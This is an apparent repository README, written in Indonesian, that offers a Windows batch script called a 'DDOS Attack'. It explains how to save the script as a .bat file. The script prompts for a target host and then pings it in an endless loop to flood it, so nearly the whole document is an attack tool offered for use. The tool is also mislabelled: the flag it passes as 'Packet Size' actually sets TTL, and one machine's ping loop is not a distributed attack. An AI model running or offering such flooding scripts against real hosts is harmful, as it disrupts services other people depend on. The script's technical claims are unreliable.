# DDos
Gunakan script ini dengan bijak
#cara pemakaian
Buka notepad pada menu lalu salin script ini
Copy lalu pastekan ke notepad lalu save dengan 
Kata .bat di ujung kata contoh DDOS.bat

$ @echo off

$ mode 67,16
$ title DDOS Attack By xxxbdzx
$ color 0b
$ cls
$ echo.
$ echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
$ echo DDOS With Batchfile By xxxdzx
$ echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
$ echo.
$ set /p x=Server-Target:
$ echo.
$ echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
$ ping %x%
$ echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
$ @ping.exe 127.0.0.1 -n 5 -w 1000 > nul
$ goto Next
$ :Next
$ echo.
$ echo.
$ echo.
$ set /p m=ip Host:
$ echo.
$ set /p n=Packet Size:
$ echo.
$ :DDOS
$ color 0d
$ echo Attacking Server %m%
$ ping %m% -i %n% -t >nul
$ goto DDOS
